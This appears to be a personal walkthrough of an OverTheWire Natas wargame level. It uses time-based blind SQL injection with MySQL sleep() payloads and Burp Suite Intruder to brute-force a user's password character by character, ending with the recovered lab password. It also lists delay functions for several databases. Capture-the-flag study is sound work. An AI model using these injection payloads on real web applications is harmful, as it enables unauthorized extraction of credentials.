PASSWORD: XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd

Username: natas18
*NO RESPONSE*

Username: natas18"
*NO RESPONSE*

*USE A QUERY TO EXECUTE ON SERVER-SIDE*
*TIME DELAYS*
*Oracle 	dbms_pipe.receive_message(('a'),10)
*Microsoft 	WAITFOR DELAY '0:0:10'
*PostgreSQL 	SELECT pg_sleep(10)
*MySQL 	SELECT SLEEP(10) 

Username: natas18" and sleep(5)#  <-----TESTING MySQL
*NO RESPONSE, AFTER 5 SECOND DELAY*  <-----GREAT SERVER-SIDE RESPONDED TO MySQL

Username: natas18" and (select length(password)=1 from users where username="natas18") and sleep(5)#
*NO RESPONSE*

*BURP SUITE*
*TOGGLE Intercept is on

*WEB BROWSER*
Username: natas18" and (select length(password)=1 from users where username="natas18") and sleep(5)#

*BURP SUITE*
*TOGGLE Intercept is off
*SEND TO REPEATER
*SEND TO Intruder  <-----TO GET PASSWORD LENGTH
*CLEAR$
*HIGHLIGHT 1 FROM "(password)=1" AND PRESS ADD$

*PAYLOADS
*PAYLOAD SET 1
*PAYLOAD TYPE NUMBERS
*NUMBER RANGE
*TYPE SEQUENTIAL
*FROM 1
*TO 50
*STEP 1

*RESOURCE POOL
*MAXIMUM CONCURRENT REQUESTS 1

*START ATTACK*
*COLUMNS*
*RESPONSE RECIEVED*
*REQUEST 32 HAS MORE THEN A 5 SECONDS OF DELAY TIME, SO THE PASSWORD HAS 32 CHARACTERS

Username: natas18" and (select substring(password, 1, 1) from users where username="natas18") LIKE BINARY 'a' and sleep(5)#  <-----WRITE IN NEW CODE IN INTRUDER, REPLACING THE "(select length(password)" CODE.

*HIGHLIGHT THE FIRST 1 FROM "(password, 1, 1)" AND THE a FROM 'a' AND PRESS ADD$

" and (select substring(password, 1, 1) from users where username="natas18") LIKE BINARY 'a' and sleep(5)#  <-----NEEDS TO BE URL ENCODED. COPY CODE AND PRESS CTRL+U

natas18"+and+(select+substring(password,+§1§,+1)+from+users+where+username%3d"natas18")+LIKE+BINARY+'§a§'+and+sleep(5)%23  <-----URL ENCODED

*ATTACK TYPE* CLUSTER BOMB

*PAYLOADS
*PAYLOAD SET 1
*PAYLOAD TYPE NUMBERS
*NUMBER RANGE
*TYPE SEQUENTIAL
*FROM 1
*TO 32
*STEP 1

*PAYLOAD SET 2 Brute forcer
*PAYLOAD TYPE Numbers
*CHARACTOR SET ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789
*MIN LENGTH 1
*MAX LENGTH 1

*RESOURSE POOL SET TO 1

*START ATTACK*
*WAIT**WAIT**WAIT**WAIT**WAIT**WAIT**WAIT**WAIT**WAIT**WAIT**WAIT**WAIT**WAIT**WAIT**WAIT**WAIT**WAIT**WAIT**WAIT**WAIT**WAIT**WAIT**WAIT**WAIT**WAIT**WAIT**WAIT**WAIT**WAIT**WAIT**WAIT**WAIT**WAIT**WAIT*

*COLUMNS*
*RESPONSE RECIEVED*

*HIGHLIGHT ALL OF THE CHARACTERS THAT TOOK LONGER THEN 5 SECONDS TO RESPOND*
*RIGHT CLICK SCROLL TO HIGHLIGHT AND PICK A COLOR*

*LEFT CLICK: FILTER: SHOWING ALL ITEMS AND CHOOSE SHOW ONLY HIGHLIGHTED ITEMS THEN APPLY*

*LEFT CLICK PAYLOAD 1 TO PUT THE PASSWORD CHARACTERS IN ORDER*

8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq  <-----PASSWORD
